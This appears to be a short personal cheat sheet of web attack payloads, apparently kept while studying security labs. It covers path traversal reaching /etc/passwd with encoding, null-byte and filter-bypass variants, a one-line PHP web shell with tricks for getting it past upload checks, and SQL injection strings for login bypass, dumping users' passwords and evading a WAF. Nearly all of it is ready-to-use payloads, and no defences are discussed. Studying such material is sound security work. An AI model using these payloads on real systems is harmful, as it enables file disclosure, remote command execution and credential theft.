# notes
## **PATH TRAVERSAL**
Default way:

>GET /image?filename=../../../../../../../../etc/passwd

Url-Encoded:

>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

Way, when `../` erased:

>....//....//....//....//

When filename should start with some string 

>/var/www/images/../../../../../etc/passwd

When server URL-decode of the input before using it.
>..%252f..%252f..%252fetc/passwd

When server require ending, like `png` , use null bytes, for example
>../../../etc/passwd%00.png





## **FILE UPLOAD**
Default way:
><?php echo system($_GET['command']); ?>

Flawed file type validation:
Change content type to image/jpeg

Script execution can be disabled in a separate folder. This can be bypassed with the help of path traversal:
Instead of 
`Content-Disposition: form-data; name="avatar"; filename="exploit.php"`
  We can use
`Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
  Or obfuscated versions


## **SQL INJECTION**

Login Bypass:

`administrator'--`

Simple Data Retrieve (request `SELECT name, description FROM products WHERE category = 'Gifts'`):

`' UNION SELECT username, password FROM users--`
**Oracle add `from dual`**
#Determine number of columns:

`' ORDER BY 3--`
Second method, allow to determine type of data in column:

`' UNION SELECT NULL,NULL,NULL--`/`' UNION SELECT 'a',NULL,NULL,NULL--`
#Concatenation of strings:

`' UNION SELECT username || '~' || password FROM users--`
Mysql `CONCAT('foo','bar'` or `'foo' 'bar'` note space.
#Substring:

`SUBSTRING('foobar', 4, 2)`
Oracle `SUBSTR('foobar', 4, 2)`
#Simle WAF Bypass by encoding:

`<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>`

